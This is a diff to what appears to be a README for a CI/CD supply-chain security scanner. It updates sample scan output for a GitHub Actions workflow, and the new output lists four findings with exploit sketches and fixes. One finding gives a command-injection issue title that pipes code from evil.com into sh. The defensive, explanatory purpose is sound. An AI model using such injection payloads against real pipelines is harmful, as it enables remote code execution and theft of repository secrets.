@@ -22,26 +22,42 @@ $ forgeguard scan .github/workflows/deploy.yml
  |  _| (_) | | | (_| |  __/ |__| | |_| | (_| | |    |_|
  |_|  \___/|_|  \__, |\___|_____/ \__,_|\__,_|_|    (_)
                 |___/                                  
-    CI/CD Supply Chain Security Scanner v1.0.2
+    CI/CD Supply Chain Security Scanner v1.0.1
     
 🔍 Scanning target: .github/workflows/deploy.yml
 
-🛑 Found 3 vulnerabilities in [GitHub CI]: .github/workflows/deploy.yml
+🛑 Found 4 vulnerabilities in [GitHub CI]: .github/workflows/deploy.yml
 ------------------------------------------------
-1. [CRITICAL] Command Injection Risk
-   Step 'Print Issue Title' evaluates untrusted context 'github.event.issue.title' in a shell script.
-   Risk: An attacker can submit a malicious payload to execute arbitrary code.
+1. [CRITICAL] Dangerous Trigger (pull_request_target)
+   📍 Location: Workflow Triggers
+   🧨 PoC / Input: on: pull_request_target
+   🧠 Exploit: Attacker opens a PR with malicious code. The workflow runs in the context of the base branch.
+   💥 Impact: Attackers can steal repository secrets or push code to main.
+   🛡️  Fix: Use 'pull_request' instead, or strictly validate PR authors.
 ------------------------------------------------
-2. [HIGH] Unpinned Action Dependency
-   Step 'Checkout code' uses unpinned action 'actions/checkout@v3'.
-   Fix: Pin dependencies to a full 40-character commit SHA.
+2. [MEDIUM] Missing Job Timeout
+   📍 Location: Job 'build'
+   🧨 PoC / Input: runs-on: ubuntu-latest (no timeout-minutes)
+   🧠 Exploit: Attacker submits an infinite loop in a PR or issue that triggers this job.
+   💥 Impact: Cryptominers or hung jobs can run for up to 6 hours, depleting GitHub Actions quotas.
+   🛡️  Fix: Add 'timeout-minutes: 15' (or an appropriate limit) to the job.
 ------------------------------------------------
-3. [MEDIUM] Missing Job Timeout
-   Job 'build' lacks 'timeout-minutes'.
-   Risk: If compromised or hung, attackers can run cryptominers on your runner for up to 6 hours.
+3. [HIGH] Unpinned Action Dependency
+   📍 Location: Step 'Checkout code'
+   🧨 PoC / Input: uses: actions/checkout@v3
+   🧠 Exploit: The maintainer's account is compromised and the v3 tag is moved to a malicious commit.
+   💥 Impact: Arbitrary code execution in your pipeline.
+   🛡️  Fix: Pin dependencies to a full 40-character commit SHA.
+------------------------------------------------
+4. [CRITICAL] Command Injection Risk
+   📍 Location: Step 'Print Issue Title'
+   🧨 PoC / Input: run: echo "${{ github.event.issue.title }}"
+   🧠 Exploit: Attacker submits an issue with title: `"; curl http://evil.com/malware | sh; echo "`
+   💥 Impact: Arbitrary code execution in your CI runner, leading to secret theft or supply chain compromise.
+   🛡️  Fix: Pass untrusted contexts via environment variables, not inline in scripts.
 ------------------------------------------------
 
-📊 Scan Complete. Total files: 1 | Total vulnerabilities found: 3
+📊 Scan Complete. Total files: 1 | Total vulnerabilities found: 4
 ```
 
 ## Features
